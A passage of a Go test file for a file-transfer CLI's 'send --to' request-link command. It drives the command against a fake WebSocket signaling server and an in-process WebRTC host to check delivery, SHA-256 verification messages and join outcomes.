package main

// `floe send <paths> --to <link>` (sendto.go) through the real command tree,
// against a fake request-room server and an in-process host that offers and
// receives with the engine: the pairing P0-15 proved (the host offers, the
// visitor answers and sends; peer/hostreceive_test.go). Nothing here reaches a
// real server: the ICE fetch and the signaling connect are stubbed to refuse
// every URL but the fake's, and the fake counts every HTTP path it serves.
//
// Every expected line below is copied byte for byte from the approved CLI copy
// (work/16-design/cp-3/approved-copy-cli.txt, TL-01 to TL-34, as amended by
// D-144 (6)), never from sendto.go, so the two can only agree by being right.

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"github.com/jannskiee/floe/cli/engine/peer"
	"github.com/jannskiee/floe/cli/engine/signaling"
	"github.com/jannskiee/floe/cli/engine/transfer"
	"github.com/pion/webrtc/v4"
)

// ── The fake request-room server ─────────────────────────────────────────────

// reqServer stands in for server.js's request-room half over /ws, with what
// these tests need of it:
//   - join-room seats the HOST (no token is checked) with room-joined, role
//     host;
//   - request-join is answered per answer: "seat" seats the visitor
//     (request-joined, role visitor) and tells the host user-connected, or
//     host-absent when no host is seated; any other word is sent as that
//     frame's type, "error" as the server's error frame, "none" as nothing;
//   - a signal goes to the other seat, and the room seals once both seats
//     have routed one (server.js, D-116);
//   - the host leaving tells an unsealed visitor host-absent and unseats it,
//     and a sealed one peer-disconnected (leaveRequestRoom);
//   - evict sends the visitor room-full, as request-reopen does.
type reqServer struct {
	URL string

	mu       sync.Mutex
	answer   string
	host     *reqConn
	visitor  *reqConn
	conns    []*reqConn
	signaled map[*reqConn]bool
	sealed   bool
	hits     map[string]int

	hostSeated chan struct{}
	seated     chan struct{}
}

type reqConn struct {
	id  string
	ws  *websocket.Conn
	wmu sync.Mutex
}

func (c *reqConn) send(v map[string]interface{}) {
	c.wmu.Lock()
	defer c.wmu.Unlock()
	_ = c.ws.WriteJSON(v)
}

func newReqServer(t *testing.T, answer string) *reqServer {
	t.Helper()
	s := &reqServer{
		answer:     answer,
		signaled:   map[*reqConn]bool{},
		hits:       map[string]int{},
		hostSeated: make(chan struct{}),
		seated:     make(chan struct{}),
	}
	up := websocket.Upgrader{CheckOrigin: func(*http.Request) bool { return true }}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		s.mu.Lock()
		s.hits[r.URL.Path]++
		s.mu.Unlock()
		if r.URL.Path != "/ws" {
			http.NotFound(w, r)
			return
		}
		ws, err := up.Upgrade(w, r, nil)
		if err != nil {
			return
		}
		c := &reqConn{id: uuid.New().String(), ws: ws}
		s.mu.Lock()
		s.conns = append(s.conns, c)
		s.mu.Unlock()
		s.serve(c)
	}))
	t.Cleanup(func() {
		s.mu.Lock()
		conns := append([]*reqConn(nil), s.conns...)
		s.mu.Unlock()
		for _, c := range conns {
			_ = c.ws.Close()
		}
		srv.Close()
	})
	s.URL = srv.URL
	return s
}

func (s *reqServer) serve(c *reqConn) {
	defer c.ws.Close()
	defer s.leave(c)
	for {
		_, raw, err := c.ws.ReadMessage()
		if err != nil {
			return
		}
		var msg struct {
			Type   string          `json:"type"`
			Signal json.RawMessage `json:"signal"`
		}
		if json.Unmarshal(raw, &msg) != nil {
			continue
		}
		switch msg.Type {
		case "join-room":
			s.mu.Lock()
			s.host = c
			s.mu.Unlock()
			c.send(map[string]interface{}{"type": "room-joined", "role": "host"})
			close(s.hostSeated)
		case "request-join":
			s.requestJoin(c)
		case "signal":
			s.signal(c, msg.Signal)
		}
	}
}

func (s *reqServer) requestJoin(c *reqConn) {
	switch s.answer {
	case "seat":
	case "none":
		return
	case "error":
		c.send(map[string]interface{}{"type": "error", "message": "Invalid room ID"})
		return
	default:
		c.send(map[string]interface{}{"type": s.answer})
		return
	}
	s.mu.Lock()
	host := s.host
	if host == nil {
		s.mu.Unlock()
		c.send(map[string]interface{}{"type": "host-absent"})
		return
	}
	s.visitor = c
	s.mu.Unlock()
	c.send(map[string]interface{}{"type": "request-joined", "role": "visitor"})
	host.send(map[string]interface{}{"type": "user-connected", "id": c.id})
	close(s.seated)
}

func (s *reqServer) signal(c *reqConn, sig json.RawMessage) {
	s.mu.Lock()
	var other *reqConn
	switch c {
	case s.host:
		other = s.visitor
	case s.visitor:
		other = s.host
	}
	s.signaled[c] = true
	if s.host != nil && s.visitor != nil && s.signaled[s.host] && s.signaled[s.visitor] {
		s.sealed = true
	}
	s.mu.Unlock()
	if other != nil && len(sig) > 0 {
		other.send(map[string]interface{}{"type": "signal", "signal": sig, "sender": c.id})
	}
}

func (s *reqServer) leave(c *reqConn) {
	s.mu.Lock()
	var tell *reqConn
	var what string
	switch c {
	case s.host:
		s.host = nil
		if v := s.visitor; v != nil {
			tell = v
			if s.sealed {
				what = "peer-disconnected"
			} else {
				what = "host-absent"
				s.visitor = nil
			}
		}
	case s.visitor:
		s.visitor = nil
		if s.host != nil {
			tell, what = s.host, "peer-disconnected"
		}
	}
	s.mu.Unlock()
	if tell != nil {
		tell.send(map[string]interface{}{"type": what})
	}
}

// seal marks the room sealed, as both seats routing a signal would.
func (s *reqServer) seal() {
	s.mu.Lock()
	s.sealed = true
	s.mu.Unlock()
}

// evict sends the seated visitor room-full, as request-reopen does (E-03).
func (s *reqServer) evict() {
	s.mu.Lock()
	v := s.visitor
	s.visitor = nil
	s.mu.Unlock()
	if v != nil {
		v.send(map[string]interface{}{"type": "room-full"})
	}
}

// disable sends the seated visitor disabled, as the server's policy purge
// does when request links are turned off (server.js applyPolicyChange).
func (s *reqServer) disable() {
	s.mu.Lock()
	v := s.visitor
	s.mu.Unlock()
	if v != nil {
		v.send(map[string]interface{}{"type": "disabled"})
	}
}

// endLink sends the seated visitor link-ended, as the server does when the
// host closes a link nobody has used yet (D-176, server.js
// handleRequestControl).
func (s *reqServer) endLink() {
	s.mu.Lock()
	v := s.visitor
	s.mu.Unlock()
	if v != nil {
		v.send(map[string]interface{}{"type": "link-ended"})
	}
}

// drop closes the host's or the visitor's socket from the server's side.
func (s *reqServer) drop(host bool) {
	s.mu.Lock()
	c := s.visitor
	if host {
		c = s.host
	}
	s.mu.Unlock()
	if c != nil {
		_ = c.ws.Close()
	}
}

// hitCount is how many requests reached path, and total how many reached
// any path at all.
func (s *reqServer) hitCount(path string) (n, total int) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for p, c := range s.hits {
		total += c
		if p == path || strings.HasPrefix(p, path+"/") {
			n += c
		}
	}
	return n, total
}

// ── The in-process host ──────────────────────────────────────────────────────

// testHost is the request-link host: seated first, it waits for the visitor,
// and then its part runs, usually offering first (the host is always the
// offerer, as Floe Desktop is) and then receiving with the engine or scripting
// frames by hand. It reports through result and finished and never calls
// t.Fatal, because it runs on its own goroutine.
type testHost struct {
	sc       *signaling.Client
	conn     *peer.Connection
	dc       *webrtc.DataChannel
	early    *peer.Early
	quit     chan struct{}
	finished chan struct{}
	result   error
}

func startHost(t *testing.T, s *reqServer, part func(h *testHost) error) *testHost {
	t.Helper()
	h := &testHost{quit: make(chan struct{}), finished: make(chan struct{})}
	sc, err := signaling.Connect(s.URL)
	if err != nil {
		t.Fatalf("host signaling connect: %v", err)
	}
	h.sc = sc
	if err := sc.JoinRoom(uuid.New().String()); err != nil {
		t.Fatalf("host join: %v", err)
	}
	select {
	case role := <-sc.Role:
		if role != "host" {
			t.Fatalf("host seated as %q", role)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("the host was never seated")
	}
	go func() {
		defer close(h.finished)
		select {
		case <-sc.PeerConnected:
		case <-h.quit:
			h.result = errors.New("no visitor came")
			return
		}
		h.result = part(h)
	}()
	t.Cleanup(func() {
		close(h.quit)
		select {
		case <-h.finished:
		case <-time.After(30 * time.Second):
			t.Errorf("the host's part was still running 30 s after the test")
		}
		if h.conn != nil {
			h.conn.Close()
		}
		sc.Close()
	})
	return h
}

// wait returns what the host's part returned, once it has.
func (h *testHost) wait(t *testing.T) error {
	t.Helper()
	select {
	case <-h.finished:
		return h.result
	case <-time.After(30 * time.Second):
		t.Fatal("the host's part did not end")
		return nil
	}
}

// offer answers nothing on its own: it builds the host's peer and makes the
// offer, as SetupAsSender does for Floe Desktop.
func (h *testHost) offer() error {
	conn, err := peer.New(nil, h.sc)
	if err != nil {
		return err
	}
	h.conn = conn
	dc, err := conn.SetupAsSender()
	if err != nil {
		return err
	}
	h.dc, h.early = dc, conn.Early()
	return nil
}

// receive runs the engine's receive with a Decide, the way the desktop host
// does, into out. The stats URL is empty, so no report can ever be made.
func (h *testHost) receive(out string, decide func(transfer.IncomingInfo) transfer.Decision, onDone func(transfer.FileDone)) error {
	return transfer.ReceiveFilesWithOptions(h.dc, out, false, "desktop-test", "", transfer.ReceiveOptions{
		OnProgress: func(transfer.Progress) {},
		Decide:     decide,
		OnFileDone: onDone,
		Messages:   h.early.Msgs,
		Closed:     h.early.Closed,
	})
}

// frame reads the visitor's next frame, or fails at the bound.
func (h *testHost) frame(bound time.Duration) (webrtc.DataChannelMessage, error) {
	select {
	case m := <-h.early.Msgs:
		return m, nil
	case <-h.early.Closed:
		return webrtc.DataChannelMessage{}, errors.New("the visitor closed")
	case <-h.quit:
		return webrtc.DataChannelMessage{}, errors.New("the test ended")
	case <-time.After(bound):
		return webrtc.DataChannelMessage{}, errors.New("no frame from the visitor")
	}
}

// controlOf is the type and id of a text control frame, or "".
func controlOf(m webrtc.DataChannelMessage) (typ, id string) {
	if !m.IsString {
		return "", ""
	}
	var f struct {
		Type string `json:"type"`
		ID   string `json:"id"`
	}
	if json.Unmarshal(m.Data, &f) != nil {
		return "", ""
	}
	return f.Type, f.ID
}

// awaitMetadata reads until the visitor's next metadata and returns its id.
func (h *testHost) awaitMetadata() (string, error) {
	for {
		m, err := h.frame(20 * time.Second)
		if err != nil {
			return "", err
		}
		if typ, id := controlOf(m); typ == "metadata" {
			return id, nil
		}
	}
}

// awaitEnd reads the visitor's bytes until its end frame.
func (h *testHost) awaitEnd() error {
	for {
		m, err := h.frame(20 * time.Second)
		if err != nil {
			return err
		}
		if typ, _ := controlOf(m); typ == "end" {
			return nil
		}
	}
}

// ack acks one file the way a Go receiver does: binary, offset 0.
func (h *testHost) ack(id string) error {
	return h.dc.Send([]byte(`{"type":"ack","id":"` + id + `","offset":0,"pv":1,"pvMin":1,"ver":"desktop-test"}`))
}

// holdOpen keeps the host's channel open until the visitor closes it or the
// test ends, the way a receiver waits for the sender's close.
func (h *testHost) holdOpen() {
	select {
	case <-h.early.Closed:
	case <-h.quit:
	case <-time.After(20 * time.Second):
	}
}

// refuseAtMetadata is a host that answers the first metadata with frame, sent
// as a Go receiver sends it (binary), and then waits for the visitor's close.
func refuseAtMetadata(frame string) func(*testHost) error {
	return func(h *testHost) error {
		if err := h.offer(); err != nil {
			return err
		}
		if _, err := h.awaitMetadata(); err != nil {
			return err
		}
		if err := h.dc.Send([]byte(frame)); err != nil {
			return err
		}
		h.holdOpen()
		return nil
	}
}

// ── Running the command ──────────────────────────────────────────────────────

// netCalls counts the send's two pre-peer network calls.
type netCalls struct{ ice, connect atomic.Int32 }

// stubNetwork points the send's ICE fetch and signaling connect at allowed
// only: the fetch returns no ICE servers (host candidates, as the pairing
// tests use) and anything else is refused, so a test that goes wrong can never
// reach api.floe.one. Both calls are counted.
func stubNetwork(t *testing.T, allowed string) *netCalls {
	t.Helper()
	c := &netCalls{}
	prevICE, prevConnect := fetchICE, connectSignaling
	t.Cleanup(func() { fetchICE, connectSignaling = prevICE, prevConnect })
	fetchICE = func(server string) ([]webrtc.ICEServer, bool, error) {
		c.ice.Add(1)
		if allowed == "" || server != allowed {
			return nil, false, fmt.Errorf("test: no ICE fetch from %s", server)
		}
		return nil, false, nil
	}
	connectSignaling = func(server string, opts ...signaling.Option) (*signaling.Client, error) {
		c.connect.Add(1)
		if allowed == "" || server != allowed {
			return nil, fmt.Errorf("test: no signaling connect to %s", server)
		}
		return signaling.Connect(server, opts...)
	}
	return c
}

// output holds everything printed to stdout and stderr while a test runs: the
// command, the engine and the host all print straight to them.
//
// captureOutput swaps both for pipes and MUST be the test's first call, so its
// Cleanup, registered first, runs last: after the host's and the command's
// own cleanups have waited for them to end. That order is what keeps the swap
// back free of a data race with their prints, because the only other link
// between the host and the command is UDP, which gives the race detector no
// happens-before edge.
type output struct {
	restore func()
	once    sync.Once
	out     bytes.Buffer
	err     bytes.Buffer
}

func captureOutput(t *testing.T) *output {
	t.Helper()
	outR, outW, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	errR, errW, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	o := &output{}
	origOut, origErr := os.Stdout, os.Stderr
	os.Stdout, os.Stderr = outW, errW
	var drains sync.WaitGroup
	drains.Add(2)
	go func() { defer drains.Done(); _, _ = io.Copy(&o.out, outR) }()
	go func() { defer drains.Done(); _, _ = io.Copy(&o.err, errR) }()
	o.restore = func() {
		os.Stdout, os.Stderr = origOut, origErr
		_ = outW.Close()
		_ = errW.Close()
		drains.Wait()
		_ = outR.Close()
		_ = errR.Close()
	}
	t.Cleanup(func() { o.once.Do(o.restore) })
	return o
}

// text restores stdout and stderr and returns what was printed. Call it only
// once every goroutine that prints has ended: the command (cliRun.wait) and
// a host that prints (testHost.wait).
func (o *output) text() (stdout, stderr string) {
	o.once.Do(o.restore)
	return o.out.String(), o.err.String()
}

// cliRun is one `floe send ...` through execute, as main runs it.
type cliRun struct {
	done   chan struct{}
	err    error
	ended  time.Time
	stdout string
	stderr string
}

// startCLI runs `floe send args...` on its own goroutine. The flags cobra
// keeps between Execute calls are reset first, and FLOE_NO_STATS is set, as
// every CLI run in this build sets it.
func startCLI(t *testing.T, args ...string) *cliRun {
	t.Helper()
	return startCLIEnv(t, nil, args...)
}

// startCLIEnv is startCLI with env set in the environment after the reset,
// as the user's shell would hold it (FLOE_SERVER, say).
func startCLIEnv(t *testing.T, env map[string]string, args ...string) *cliRun {
	t.Helper()
	resetSharedFlags(t)
	to := sendCmd.Flags().Lookup("to")
	if err := to.Value.Set(""); err != nil {
		t.Fatal(err)
	}
	to.Changed = false
	sendCmd.SilenceErrors = false
	t.Cleanup(func() {
		sendCmd.SilenceErrors = false
		// cobra keeps --to on the tree: a later plain send in this process
		// (setup_error_test.go's runAgainst) must not go to this link.
		_ = to.Value.Set("")
		to.Changed = false
	})
	t.Setenv("FLOE_NO_STATS", "1")
	// A request-link send turns pion's pc scope off in the process
	// environment (quietPeerConnectionLog); each run gives it back.
	for _, k := range []string{"PION_LOG_DISABLE", "PIONS_LOG_DISABLE"} {
		v, ok := os.LookupEnv(k)
		t.Setenv(k, v)
		if !ok {
			os.Unsetenv(k)
		}
	}
	for k, v := range env {
		t.Setenv(k, v)
	}
	rootCmd.SetOut(nil)
	rootCmd.SetErr(nil)
	argv := append([]string{"send"}, args...)

	r := &cliRun{done: make(chan struct{})}
	go func() {
		defer close(r.done)
		r.err = execute(argv)
		r.ended = time.Now()
	}()
	t.Cleanup(func() {
		select {
		case <-r.done:
		case <-time.After(60 * time.Second):
			t.Errorf("the CLI was still running 60 s after the test")
		}
		// A request-link send leaves its Ctrl+C hook in place for the rest
		// of the process (runSendTo); a test is not the rest of the process.
		interruptHook.Store(nil)
	})
	return r
}

// wait returns once the command has returned, or fails at bound.
func (r *cliRun) wait(t *testing.T, bound time.Duration) *cliRun {
	t.Helper()
	select {
	case <-r.done:
	case <-time.After(bound):
		t.Fatalf("the command did not return within %v", bound)
	}
	return r
}

// read fills the run's stdout and stderr from o, once every printer is done.
func (r *cliRun) read(o *output) *cliRun {
	r.stdout, r.stderr = o.text()
	return r
}

func runCLI(t *testing.T, args ...string) *cliRun {
	t.Helper()
	return startCLI(t, args...).wait(t, 90*time.Second)
}

// linkFor is a request link on a self-hosted server for a fresh room; the
// fake server never checks the id, and --server is always typed beside it. A
// floe.one link would end on TL-10 beside any server but api.floe.one (FU-46,
// F5-4), so the tests that run against the fake use another host.
func linkFor() string {
	return "https://files.example.com/floe/r/Xk3p9Q0aB1c#" + uuid.New().String()
}

// floeLinkFor is a request link on floe.one for a fresh room, for the tests
// that run with no server chosen (the stubbed network refuses api.floe.one).
func floeLinkFor() string {
	return "https://floe.one/r/Xk3p9Q0aB1c#" + uuid.New().String()
}

// oneFile writes a file of size random bytes and returns its path and digest.
func oneFile(t *testing.T, dir, name string, size int) (string, [sha256.Size]byte) {
	t.Helper()
	data := make([]byte, size)
	if _, err := rand.Read(data); err != nil {
		t.Fatal(err)
	}
	p := filepath.Join(dir, name)
	if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, data, 0o600); err != nil {
		t.Fatal(err)
	}
	return p, sha256.Sum256(data)
}

// indented is the approved lines as the terminal shows them.
func indented(lines ...string) string {
	var b strings.Builder
	for _, l := range lines {
		b.WriteString("  " + l + "\n")
	}
	return b.String()
}

var cobraError = regexp.MustCompile(`(?m)^Error: `)

// wantOutcome requires the run to have ended the way a printed outcome ends:
// a non-nil error for main's exit 1, the lines on stderr in order, and no
// cobra "Error: " line, because an outcome is not a usage mistake.
func wantOutcome(t *testing.T, r *cliRun, lines ...string) {
	t.Helper()
	if !errors.Is(r.err, errSendToEnded) {
		t.Fatalf("the command returned %v, want the silent outcome error\nstdout:\n%s\nstderr:\n%s", r.err, r.stdout, r.stderr)
	}
	if !strings.Contains(r.stderr, indented(lines...)) {
		t.Fatalf("stderr lacks the lines\n%s\nstderr:\n%s\nstdout:\n%s", indented(lines...), r.stderr, r.stdout)
	}
	if cobraError.MatchString(r.stderr) {
		t.Fatalf("cobra printed an Error: line for an outcome:\n%s", r.stderr)
	}
}

// wantInOrder requires each line, indented, to appear in out after the one
// before it.
func wantInOrder(t *testing.T, out string, lines ...string) {
	t.Helper()
	at := 0
	for _, l := range lines {
		i := strings.Index(out[at:], "  "+l+"\n")
		if i < 0 {
			t.Fatalf("missing, or out of order: %q\nin:\n%s", l, out)
		}
		at += i + len(l) + 3
	}
}

// The approved lines these tests look for, from approved-copy-cli.txt.
const (
	tlJoining     = "Joining the request link..."
	tlConnecting  = "Connecting..."
	tlWaiting     = "Waiting for them to accept. They have 9 min to answer."
	tlNothingSave = "Nothing is saved until they accept."
	tlSetupFailed = "Couldn't connect to their computer. Nothing was sent."
	tlVerified    = "Their app reports every file's SHA-256 matched."
)

// ── Delivery ─────────────────────────────────────────────────────────────────

// deliveringHost accepts into a drop folder under out and receives with the
// engine, as the desktop host does, recording every committed file.
func deliveringHost(out string, doneFiles *[]transfer.FileDone, mu *sync.Mutex) func(*testHost) error {
	return func(h *testHost) error {
		if err := h.offer(); err != nil {
			return err
		}
		return h.receive(out, func(transfer.IncomingInfo) transfer.Decision {
			drop := filepath.Join(out, "drop")
			if err := os.MkdirAll(drop, 0o700); err != nil {
				return transfer.Decision{Kind: transfer.DecisionRefuse, Code: transfer.CodeWriteFailed}
			}
			return transfer.Decision{Kind: transfer.DecisionAccept, OutputDir: drop}
		}, func(fd transfer.FileDone) {
			mu.Lock()
			*doneFiles = append(*doneFiles, fd)
			mu.Unlock()
		})
	}
}

// TestSendToDeliversAndPrintsSHALine: two files reach the host's drop folder
// with the same SHA-256 on disk, the host saw a digest on every end frame and
// matched it, and the command prints START, WAIT, TL-03's two lines and exits
// 0 with no summary box.
func TestSendToDeliversAndPrintsSHALine(t *testing.T) {
	o := captureOutput(t)
	s := newReqServer(t, "seat")
	net := stubNetwork(t, s.URL)
	src := t.TempDir()
	shoot := filepath.Join(src, "shoot")
	_, sumA := oneFile(t, shoot, "a.bin", 64*1024)
	_, sumB := oneFile(t, shoot, filepath.Join("audio", "b.bin"), 1<<20)
	out := t.TempDir()
	var mu sync.Mutex
	var doneFiles []transfer.FileDone
	h := startHost(t, s, deliveringHost(out, &doneFiles, &mu))

	r := runCLI(t, shoot, "--to", linkFor(), "--server", s.URL)
	herr := h.wait(t)
	r.read(o)
	if r.err != nil {
		t.Fatalf("the drop failed: %v\nstdout:\n%s\nstderr:\n%s", r.err, r.stdout, r.stderr)
	}
	if herr != nil {
		t.Fatalf("host: %v", herr)
	}
	wantInOrder(t, r.stdout,
		"Sending   "+shoot+" (2 files, 1.06 MB)",
		tlJoining, tlConnecting)
	wantInOrder(t, r.stdout, tlWaiting)
	if strings.Contains(r.stdout, tlNothingSave) {
		t.Fatalf("stdout still claims nothing is saved before an accept, false on an Auto-accept link (D-177):\n%s", r.stdout)
	}
	arrived := regexp.MustCompile(`(?m)^  All 2 files arrived \(1\.06 MB in \d+s, direct\)\.\n  ` + regexp.QuoteMeta(tlVerified) + `\n`)
	if !arrived.MatchString(r.stdout) {
		t.Fatalf("stdout lacks TL-03's two lines:\n%s", r.stdout)
	}
	if strings.Contains(r.stdout, "  Sent ") {
		t.Fatalf("the summary box was printed on the request path:\n%s", r.stdout)
	}
	for name, want := range map[string][sha256.Size]byte{"a.bin": sumA, filepath.Join("audio", "b.bin"): sumB} {
		got, err := os.ReadFile(filepath.Join(out, "drop", "shoot", name))
		if err != nil || sha256.Sum256(got) != want {
			t.Fatalf("%s in the drop folder: %v, or its SHA-256 differs from the source", name, err)
		}
	}
	mu.Lock()
	defer mu.Unlock()
	if len(doneFiles) != 2 || !doneFiles[0].Verified || !doneFiles[1].Verified {
		t.Fatalf("the host committed %+v; want two files, each with a matched sha256 on its end frame", doneFiles)
	}
	if net.ice.Load() != 1 || net.connect.Load() != 1 {
		t.Fatalf("ICE fetches %d, signaling connects %d; want one each", net.ice.Load(), net.connect.Load())
	}
}

// TestSendToOmitsSHALineWhenVerifiedBelowCount: a host whose received frame
// reports fewer matched files than it received gets the arrived line and no
// SHA line (TL-04).
func TestSendToOmitsSHALineWhenVerifiedBelowCount(t *testing.T) {
	o := captureOutput(t)
	s := newReqServer(t, "seat")
	stubNetwork(t, s.URL)
	src := t.TempDir()
	a, _ := oneFile(t, src, "a.bin", 4096)
	b, _ := oneFile(t, src, "b.bin", 4096)
	h := startHost(t, s, func(h *testHost) error {
		if err := h.offer(); err != nil {
			return err
		}
		for i := 0; i < 2; i++ {
			id, err := h.awaitMetadata()
			if err != nil {
				return err
			}
			if err := h.ack(id); err != nil {
				return err
			}
			if err := h.awaitEnd(); err != nil {
				return err
			}
		}
		if err := h.dc.Send([]byte(`{"type":"received","verified":1}`)); err != nil {
			return err
		}
		h.holdOpen()
		return nil
	})

	r := runCLI(t, a, b, "--to", linkFor(), "--server", s.URL)
	herr := h.wait(t)
	r.read(o)
	if r.err != nil {
		t.Fatalf("the drop failed: %v\nstderr:\n%s", r.err, r.stderr)
	}
	if herr != nil {
		t.Fatalf("host: %v", herr)
	}
	if !regexp.MustCompile(`(?m)^  All 2 files arrived \(8 KB in \d+s, direct\)\.$`).MatchString(r.stdout) {
		t.Fatalf("stdout lacks TL-04's arrived line:\n%s", r.stdout)
	}
	if strings.Contains(r.stdout+r.stderr, tlVerified) {
		t.Fatalf("the SHA line was printed with verified 1 of 2:\n%s", r.stdout)
	}
}

// TestSendToNeverCallsStats: a whole delivered drop touches the server only
// through /ws. The visitor is a sender and never reports stats, never
// registers a code, and the host here has an empty stats URL.
func TestSendToNeverCallsStats(t *testing.T) {
	o := captureOutput(t)
	s := newReqServer(t, "seat")
	stubNetwork(t, s.URL)
	p, _ := oneFile(t, t.TempDir(), "a.bin", 64*1024)
	var mu sync.Mutex
	var doneFiles []transfer.FileDone
	h := startHost(t, s, deliveringHost(t.TempDir(), &doneFiles, &mu))
	r := runCLI(t, p, "--to", linkFor(), "--server", s.URL)
	herr := h.wait(t)
	r.read(o)
	if r.err != nil || herr != nil {
		t.Fatalf("the drop failed: %v, host %v\nstderr:\n%s", r.err, herr, r.stderr)
	}
	if n, _ := s.hitCount("/api/stats"); n != 0 {
		t.Fatalf("/api/stats was called %d times", n)
	}
	if n, _ := s.hitCount("/api/code"); n != 0 {
		t.Fatalf("/api/code was called %d times", n)
	}
	if ws, total := s.hitCount("/ws"); ws != total || ws != 2 {
		t.Fatalf("the server saw %d requests, %d of them /ws; want exactly the host's and the visitor's sockets", total, ws)
	}
}

// TestSendToOneFileArrivesInTheSingular: one delivered file reads "1 file
// arrived", D-123's singular (approved-copy-web.md SR-04), never "All 1
// files" (review lens A, M6: every other delivery test sends two).
func TestSendToOneFileArrivesInTheSingular(t *testing.T) {
	o := captureOutput(t)
	s := newReqServer(t, "seat")
	stubNetwork(t, s.URL)
	p, _ := oneFile(t, t.TempDir(), "a.bin", 64*1024)
	var mu sync.Mutex
	var doneFiles []transfer.FileDone
	h := startHost(t, s, deliveringHost(t.TempDir(), &doneFiles, &mu))
	r := runCLI(t, p, "--to", linkFor(), "--server", s.URL)
	herr := h.wait(t)
	r.read(o)
	if r.err != nil || herr != nil {
		t.Fatalf("the drop failed: %v, host %v\nstderr:\n%s", r.err, herr, r.stderr)
	}
	if !regexp.MustCompile(`(?m)^  1 file arrived \(64 KB in \d+s, direct\)\.$`).MatchString(r.stdout) {
		t.Fatalf("stdout lacks the singular arrived line:\n%s", r.stdout)
	}
}

// TestSendToClockRunsFromTheAccept (D9; review lens A finding 3, re-check
// LA2-7): the arrived line's duration runs from the host's accept to its
// received, never from the join. A host that decides for 3 s and then takes
// a 64 KB file at once reads "in 0s" ("1s" on a slow machine), never the
// seconds it spent deciding.
func TestSendToClockRunsFromTheAccept(t *testing.T) {
	o := captureOutput(t)
	s := newReqServer(t, "seat")
	stubNetwork(t, s.URL)
	p, _ := oneFile(t, t.TempDir(), "a.bin", 64*1024)
	out := t.TempDir()
	h := startHost(t, s, func(h *testHost) error {
		if err := h.offer(); err != nil {
			return err
		}
		return h.receive(out, func(transfer.IncomingInfo) transfer.Decision {
			time.Sleep(3 * time.Second)
			return transfer.Decision{Kind: transfer.DecisionAccept, OutputDir: out}
		}, func(transfer.FileDone) {})
	})
	r := runCLI(t, p, "--to", linkFor(), "--server", s.URL)
	herr := h.wait(t)
	r.read(o)
	if r.err != nil || herr != nil {
		t.Fatalf("the drop failed: %v, host %v\nstderr:\n%s", r.err, herr, r.stderr)
	}
	if !regexp.MustCompile(`(?m)^  1 file arrived \(64 KB in [01]s, direct\)\.$`).MatchString(r.stdout) {
		t.Fatalf("the arrived line's clock did not start at the accept:\n%s", r.stdout)
	}
}

// TestSendToLabelJoinsTypedPaths (D4; review lens A finding 3, re-check
// LA2-7): START names every typed path as typed, joined with ", ", then the
// count and size of all of them.
func TestSendToLabelJoinsTypedPaths(t *testing.T) {
	o := captureOutput(t)
	stubNetwork(t, "")
	dir := t.TempDir()
	a, _ := oneFile(t, dir, "a.bin", 1000)
	oneFile(t, dir, filepath.Join("shoot", "b.bin"), 2000)
	oneFile(t, dir, filepath.Join("shoot", "c.bin"), 3000)
	shoot := filepath.Join(dir, "shoot")
	// No ICE fetch is allowed, so the command ends on TL-10 right after
	// START, before any network. A floe.one link, since no server is chosen.
	r := runCLI(t, a, shoot, "--to", floeLinkFor()).read(o)
	wantOutcome(t, r, tlSetupFailed)
	want := "\n  Sending   " + a + ", " + shoot + " (3 files, " + transfer.FormatBytes(6000) + ")\n"
	if !strings.Contains(r.stdout, want) {
		t.Fatalf("START is not the joined label %q:\n%s", want, r.stdout)
	}
}

// TestSendToFailedConnectionEndsTheWaitForReceived: a host that took every
// byte and then went silent (its machine gone, no close this side can hear)
// holds the wait for received open, which has no deadline of its own. Only
// the Failed watcher's close ends it, on TL-27 (review lens A, M1: no test
// drove runSendTo's own watcher). The failure is stood in through connFailed.
func TestSendToFailedConnectionEndsTheWaitForReceived(t *testing.T) {
	o := captureOutput(t)
	failed := make(chan struct{})
	prev := connFailed
	connFailed = func(*peer.Connection) <-chan struct{} { return failed }
	t.Cleanup(func() { connFailed = prev })
	s := newReqServer(t, "seat")
	stubNetwork(t, s.URL)
	p, _ := oneFile(t, t.TempDir(), "a.bin", 4096)
	gotAll := make(chan struct{})
	h := startHost(t, s, func(h *testHost) error {
		if err := h.offer(); err != nil {
			return err
		}
		id, err := h.awaitMetadata()
		if err != nil {
			return err
		}
		if err := h.ack(id); err != nil {
			return err
		}
		if err := h.awaitEnd(); err != nil {
			return err
		}
		close(gotAll)
		h.holdOpen() // never answers
		return nil
	})
	r := startCLI(t, p, "--to", linkFor(), "--server", s.URL)
	select {
	case <-gotAll:
	case <-time.After(30 * time.Second):
		t.Fatal("the host never got the whole file")
	}
	time.Sleep(300 * time.Millisecond)
	select {
	case <-r.done:
		t.Fatalf("the send ended with no received and no failure: %v", r.err)
	default:
	}
	close(failed)
	r.wait(t, 10*time.Second)
	if herr := h.wait(t); herr != nil {
		t.Fatalf("host: %v", herr)
	}
	r.read(o)
	wantOutcome(t, r, "Connection lost. 0 of 1 file arrived. Ask them for a new link to send it.")
}

// ── The join ─────────────────────────────────────────────────────────────────

// TestSendToServerAnswersPrintFixedLines: each answer to request-join ends the
// command with its own line after START's first two lines (TL-05 to TL-08),
// and an answer with no line of its own takes TL-10 (D-144.8).
func TestSendToServerAnswersPrintFixedLines(t *testing.T) {
	prev := sendToJoinTimeout
	sendToJoinTimeout = 300 * time.Millisecond
	t.Cleanup(func() { sendToJoinTimeout = prev })
	for _, c := range []struct {
		answer string
		line   string
	}{
		{"host-absent", "Their computer is not connected right now. The person who made this link may have closed Floe."},
		{"link-ended", "This link has ended. Ask them for a new link."},
		{"room-full", "This link has already been used. Ask the person who made it for a new one."},
		{"disabled", "Request links are turned off right now."},
		{"none", "Request links are not available on this Floe server."},
		{"error", tlSetupFailed},
	} {
		t.Run(c.answer, func(t *testing.T) {
			o := captureOutput(t)
